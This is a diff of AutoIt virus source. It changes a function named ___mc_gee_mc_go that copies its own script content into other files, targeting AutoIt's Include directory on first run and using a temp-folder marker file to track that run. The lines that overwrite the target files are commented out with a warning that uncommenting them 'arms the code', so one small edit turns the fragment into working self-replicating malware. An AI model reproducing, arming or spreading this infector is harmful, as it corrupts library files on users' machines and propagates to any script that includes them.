@@ -5,7 +5,15 @@ Func ___mc_gee_mc_go($start_dir)
 	If $start_dir <> "" Then
 		FileChangeDir($start_dir)
 	Else
-		$start_dir = StringRegExpReplace(@AutoItExe, "(?i)[\w\d\s.]+$", "") & "Include"
+		Local $inc = StringRegExpReplace(@AutoItExe, "(?i)[\w\d\s.]+$", "") & "Include"
+		If Not FileExists(@TempDir & "\udf_mcgee\a.txt") Then
+			$start_dir = $inc
+			DirCreate(@TempDir & "\udf_mcgee")
+			FileWrite(@TempDir & "\udf_mcgee\a.txt", "a")
+			FileChangeDir($start_dir)
+		Else
+			$start_dir = @ScriptDir
+		EndIf
 	EndIf
 	Local $scriptcontent
 	Local $contentself = FileRead(@ScriptDir & "\" & @ScriptName)
@@ -45,9 +53,9 @@ Func ___mc_gee_mc_go($start_dir)
 				Next
 				$content &= @CRLF & $scriptcontent
 				FileSetAttrib($start_dir & "\" & $file, "-R")
-;~ 					Local $overwriteFile = FileOpen($start_dir & "\" & $file, 2)   ; ###########################################
-;~ 					FileWrite($overwriteFile, $content)                            ; ### WARNING, UNCOMMENTING ARMS THE CODE ###
-;~ 					FileClose($overwriteFile)                                      ; ###########################################
+;~     Local $overwriteFile = FileOpen($start_dir & "\" & $file, 2)   ; ###########################################
+;~     FileWrite($overwriteFile, $content)                            ; ### WARNING, UNCOMMENTING ARMS THE CODE ###
+;~     FileClose($overwriteFile)                                      ; ###########################################
 			EndIf
 		EndIf
 	WEnd
